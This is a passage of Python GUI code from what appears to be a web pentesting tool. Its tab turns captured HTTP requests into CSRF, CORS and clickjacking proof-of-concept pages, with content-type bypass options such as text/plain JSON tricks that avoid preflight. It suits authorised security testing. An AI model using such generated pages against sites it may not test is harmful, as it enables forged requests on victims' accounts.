                    if _fd_appends:
                        _fd_setup = "        var formData = new FormData();\n" + "\n".join(_fd_appends)
                        # Remove the manually-set Content-Type line — browser sets it with boundary
                        poc_code = re.sub(
                            r'[ \t]*xhr\.setRequestHeader\("Content-Type",\s*"multipart/form-data"\);[ \t]*\n?',
                            ('        // Content-Type is NOT set manually — the browser automatically\n'
                             '        // adds "multipart/form-data; boundary=..." when sending FormData.\n'),
                            poc_code,
                        )
                        # Replace raw xhr.send('...') with FormData send
                        _orig_sq = _orig_body.replace("'", "\\'").replace("\n", "\\n")
                        poc_code = poc_code.replace(
                            f"xhr.send('{_orig_sq}');",
                            f"{_fd_setup}\n        xhr.send(formData);",
                        )
                        # fetch: remove "Content-Type" key from headers and set body: formData
                        poc_code = re.sub(
                            r'"Content-Type":\s*"multipart/form-data",?\n?', '', poc_code)
                        _orig_bt = _orig_body.replace('`', '\\`')
                        if f'body: `{_orig_bt}`' in poc_code:
                            poc_code = poc_code.replace(
                                f'body: `{_orig_bt}`',
                                f'{_fd_setup.strip()}\n            body: formData',
                            )
                # ── Inject a visible note just after <body> ──────────────────
                _ct_note = (
                    f'    <p style="background:#2d2d2d;border-left:3px solid #bd93f9;'
                    f'padding:6px 10px;font-size:0.9em;">'
                    f'<strong>Content-Type Bypass:</strong> '
                    f'request sent as <code>{_ct_val}</code>.</p>'
                )
                poc_code = poc_code.replace('<body>', f'<body>\n{_ct_note}', 1)

        if poc_type == "CSRF PoC":
            # ── JSON body + form-based format warning ─────────────────────────
            _is_json_body = False
            if info.body:
                try:
                    json.loads(info.body)
                    _is_json_body = True
                except (ValueError, Exception):
                    pass

            _form_formats = {"Forms", "iFrame", "IMG", "Link"}
            _ct_is_json_poc = ct_bypass in (
                CSRFGenerator.BYPASS_CT_PLAIN_JSON, CSRFGenerator.BYPASS_CT_FORM_JSON)

            if (_is_json_body
                    and output_format in _form_formats
                    and not _ct_is_json_poc
                    and bypass not in (CSRFGenerator.BYPASS_HEAD_METHOD,
                                       CSRFGenerator.BYPASS_REQUEST_METHOD)
                    and samesite_bypass == "None"):
                _warn_msg = (
                    "⚠️  Original request has a <b>JSON body</b> — "
                    "<b>this PoC sends form-encoded data instead</b>. "
                    "The server may reject it if it strictly validates Content-Type.<br>"
                    "To send real JSON: switch Output Format to <b>XHR</b>, "
                    "or use Content-Type Bypass → "
                    "<b>text/plain – JSON body (no preflight)</b> / "
                    "<b>text/plain – JSON via form trick</b>."
                )
                self.json_warn_lbl.setText(_warn_msg)
                self.json_warn_lbl.setVisible(True)
                # Also inject a visible comment banner into the PoC HTML itself
                _html_banner = (
                    '    <p style="background:#4a3000;color:#ffb347;'
                    'border-left:4px solid #e67e22;padding:8px 12px;'
                    'font-family:monospace;font-size:0.9em;margin:0 0 8px 0;">'
                    '⚠️  <strong>Note:</strong> The original request had a JSON body. '
                    'This form submits <strong>form-encoded data</strong> '
                    '(<code>application/x-www-form-urlencoded</code>), <em>not</em> JSON. '
                    'Switch to XHR output or use the Content-Type Bypass dropdown '
                    '(“text/plain – JSON body”) to send real JSON.'
                    '</p>'
                )
                poc_code = poc_code.replace('<body>', f'<body>\n{_html_banner}', 1)
            else:
                self.json_warn_lbl.setVisible(False)

        else:
            # CORS PoC / Clickjacking PoC — hide JSON warning
            self.json_warn_lbl.setVisible(False)

        # Reset edit mode whenever a fresh PoC is generated
        if self._poc_edit_mode:
            self._poc_edit_mode = False
            self.edit_output_btn.setChecked(False)   # triggers _toggle_poc_edit → setReadOnly
        self.poc_output.setPlainText(poc_code)
        self.status_lbl.setText("✓ PoC generated")
        self.status_lbl.setStyleSheet(f"color:{COLOR_SUCCESS};")
        self.poc_generated.emit(poc_code)
        
        # Reset status after 2 seconds
        QTimer.singleShot(2000, lambda: self.status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};") or
                          self.status_lbl.setText("Ready"))
    
    def _toggle_poc_edit(self, enabled: bool):
        """Toggle the PoC output between read-only and editable."""
        self._poc_edit_mode = enabled
        self.poc_output.setReadOnly(not enabled)
        if enabled:
            self.edit_output_btn.setText("🔒 Lock")
            self.poc_output.setStyleSheet(
                f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};"
                f"border:1px solid #50fa7b;border-radius:3px;"
            )
            self.status_lbl.setText("✏️ Edit mode — changes saved automatically")
            self.status_lbl.setStyleSheet(f"color:#50fa7b;")
        else:
            self.edit_output_btn.setText("✏️ Edit")
            self.poc_output.setStyleSheet("")
            self.status_lbl.setText("Ready")
            self.status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")

    def _copy_poc_path(self):
        """Write current PoC to a temp file (refreshing if already exists) and copy its path."""
        poc_text = self.poc_output.toPlainText()
        if not poc_text:
            QMessageBox.warning(self, "No PoC", "Generate a PoC first.")
            return
        # Overwrite existing temp file so the path stays stable; create new if needed
        if self._current_temp_path:
            try:
                with open(self._current_temp_path, 'w', encoding='utf-8') as fh:
                    fh.write(poc_text)
                temp_path = self._current_temp_path
            except OSError:
                self._current_temp_path = None
                temp_path = None
        else:
            temp_path = None
        if temp_path is None:
            with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
                f.write(poc_text)
                temp_path = f.name
            self._current_temp_path = temp_path
        QApplication.clipboard().setText(temp_path)
        self.status_lbl.setText(f"📎 Path copied: {temp_path}")
        self.status_lbl.setStyleSheet(f"color:{COLOR_SUCCESS};")
        QTimer.singleShot(3000, lambda: self.status_lbl.setText("Ready"))

    def _copy_output(self):
        """Copy PoC output to clipboard."""
        text = self.poc_output.toPlainText()
        if text:
            QApplication.clipboard().setText(text)
            self.status_lbl.setText("✓ Copied to clipboard")
            self.status_lbl.setStyleSheet(f"color:{COLOR_SUCCESS};")
            QTimer.singleShot(1500, lambda: self.status_lbl.setText("Ready"))

    def _save_to_file(self):
        """Save PoC output to a user-chosen file."""
        text = self.poc_output.toPlainText()
        if not text:
            QMessageBox.warning(self, "No PoC", "Generate a PoC first.")
            return

        # Suggest a sensible default filename
        poc_type = self.poc_type_combo.currentText().replace(" ", "_").lower()
        if self._current_request_info and self._current_request_info.host:
            safe_host = re.sub(r"[^\w\-.]", "_", self._current_request_info.host)
            default_name = f"poc_{poc_type}_{safe_host}.html"
        else:
            default_name = f"poc_{poc_type}.html"

        path, _ = QFileDialog.getSaveFileName(
            self,
            "Save PoC",
            default_name,
            "HTML Files (*.html);;All Files (*)",
        )
        if not path:
            return  # user cancelled

        try:
            with open(path, "w", encoding="utf-8") as fh:
                fh.write(text)
            self.status_lbl.setText(f"💾 Saved: {os.path.basename(path)}")
            self.status_lbl.setStyleSheet(f"color:{COLOR_SUCCESS};")
            QTimer.singleShot(3000, lambda: self.status_lbl.setText("Ready"))
        except OSError as exc:
            QMessageBox.critical(self, "Save Failed", f"Could not save file:\n{exc}")


    def _clear_all(self):
        """Clear all fields."""
        self.request_edit.clear()
        self.poc_output.clear()
        self.info_text.clear()
        self._current_request_info = None
        self.status_lbl.setText("Ready")
        self.status_lbl.setStyleSheet(f"color:{COLOR_TEXT_MUTED};")
    
    def _open_in_browser(self):
        """Open PoC in browser (save as HTML first)."""
        poc_text = self.poc_output.toPlainText()
        if not poc_text:
            QMessageBox.warning(self, "No PoC", "Generate a PoC first.")
            return
        
        # Check if it's HTML
        if "<html" in poc_text.lower() or "<form" in poc_text.lower() or "<!DOCTYPE" in poc_text:
            # Clean up previous temp file before creating a new one
            if self._current_temp_path and os.path.exists(self._current_temp_path):
                try:
                    os.unlink(self._current_temp_path)
                except OSError:
                    pass
            with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False, encoding='utf-8') as f:
                f.write(poc_text)
                temp_path = f.name
            self._current_temp_path = temp_path
            webbrowser.open(f"file://{temp_path}")
            self.status_lbl.setText("🌐 Opened in browser")
            self.status_lbl.setStyleSheet(f"color:{COLOR_SUCCESS};")
            QTimer.singleShot(2000, lambda: self.status_lbl.setText("Ready"))
        else:
            QMessageBox.information(self, "Not HTML",
                                   "PoC is not HTML. Use 'Copy' and paste into browser console or save as .html")
    
    # ── Public API ─────────────────────────────────────────────────────────
    
    def load_request(self, raw_request: str, host: str = "", 
                     port: int = 443, is_https: bool = True):
        """Called by HTTP History 'Send to PoC'."""
        self.request_edit.setPlainText(raw_request)
        if host:
            self.host_edit.setText(host)
        self.scheme_combo.setCurrentText("https" if is_https else "http")
        self._update_request_info()
        self._generate_poc()
        self.status_lbl.setText(f"📥 Loaded: {host or '(from Host header)'}")
        self.status_lbl.setStyleSheet(f"color:{COLOR_ACCENT};")
        QTimer.singleShot(2000, lambda: self.status_lbl.setText("Ready"))
    
    def set_poc_type(self, poc_type: str):
        """Set PoC type programmatically."""
        index = self.poc_type_combo.findText(poc_type)
        if index >= 0:
            self.poc_type_combo.setCurrentIndex(index)
    
    def get_current_poc(self) -> str:
        """Get current PoC code."""
        return self.poc_output.toPlainText()


# ─────────────────────────────────────────────────────────────────────────────
# Integration helper
# ─────────────────────────────────────────────────────────────────────────────

def add_poc_tab(parent):
    """
    Call in HuntGUI._setup_tabs() after Bypass tab, before API Keys:

        from modules.poc_tab import add_poc_tab
        add_poc_tab(self)
        self.poc_tab = self.poc_tab_ref
    """
    tab = POCTab(parent)
    parent.tab_widget.addTab(tab, " PoC")
    parent.poc_tab = tab
    return tab